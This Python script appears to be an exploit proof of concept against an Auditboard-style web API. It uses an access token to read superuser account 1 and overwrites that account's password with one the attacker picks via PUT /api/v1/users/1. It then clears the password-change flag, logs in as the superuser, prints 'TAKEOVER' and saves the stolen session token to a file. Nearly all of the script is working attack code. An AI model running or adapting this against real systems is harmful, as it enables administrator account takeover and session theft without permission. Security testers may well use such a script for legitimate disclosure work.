import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!su47test"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()

c,b=req('GET','/api/v1/users/1'); u=json.loads(b)['users'][0]
print("Superuser 1:",u['email'],"role",u['role_id'],"req_pw_change",u['requires_password_change'])
print("\n=== control: login as superuser with a WRONG password ===")
c,b=login(u['email'],"DefinitelyWrong999!")
print("  ",c,b[:150].replace(chr(10),' '))

print("\n=== write attacker-chosen password onto Superuser 1 ===")
c,b=req('PUT','/api/v1/users/1',{"user":{"password":PW}})
print("  PUT /users/1 ->",c, b[:120].replace(chr(10),' '))
c,b=req('PUT','/api/v1/users/1',{"user":{"requires_password_change":False}})
print("  clear flag ->",c)

print("\n=== login as Superuser with attacker password ===")
c,b=login(u['email'],PW)
print("  HTTP",c)
if c=='200':
    s=json.loads(b)['session']
    print("  TAKEOVER: id",s['id'],s['email'],"role",s['role_id'])
    print("  token:",s['token'][:40]+"...")
    open('/tmp/su_tok','w').write(s['token'])
else:
    print("  ",b[:200])
